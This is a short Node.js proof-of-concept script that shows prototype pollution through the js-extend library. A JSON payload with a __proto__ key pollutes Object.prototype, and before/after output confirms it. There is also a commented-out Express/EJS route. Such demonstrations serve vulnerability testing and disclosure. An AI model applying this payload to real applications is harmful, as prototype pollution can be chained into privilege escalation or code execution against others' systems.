var extend = require('js-extend').extend
const ejs = require('ejs')
const express = require('express')

const app = express()

var jsExtend = require("js-extend")
var obj = {}
var malicious_payload = '{"__proto__":{"polluted":"Yes! Its Polluted"}}';
console.log("Before: " + {}.polluted);
jsExtend.extend({}, JSON.parse(malicious_payload));
console.log("After : " + {}.polluted);

// app.get("/", async (req, res) => {
//     const html = await ejs.renderFile(__dirname + "/templates/index.ejs",{sentence});
//     res.end(html)
// })

